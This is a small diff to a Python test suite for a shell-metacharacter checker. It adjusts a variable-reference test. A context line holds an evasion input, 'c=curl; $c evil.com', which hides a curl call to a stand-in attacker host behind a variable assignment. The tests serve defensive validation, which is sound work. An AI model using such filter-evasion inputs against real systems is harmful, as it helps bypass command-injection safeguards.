@@ -61,9 +61,9 @@ class TestMetacharEvasion:
         assert "empty quote" in result
 
     def test_blocked_variable_ref(self):
-        result = _check_shell_metacharacters("$HOME/bin/bash")
+        result = _check_shell_metacharacters("$SHELL")
         assert result is not None
-        assert "$VAR" in result
+        assert "variable reference" in result
 
     def test_blocked_variable_assignment_ref(self):
         result = _check_shell_metacharacters("c=curl; $c evil.com")
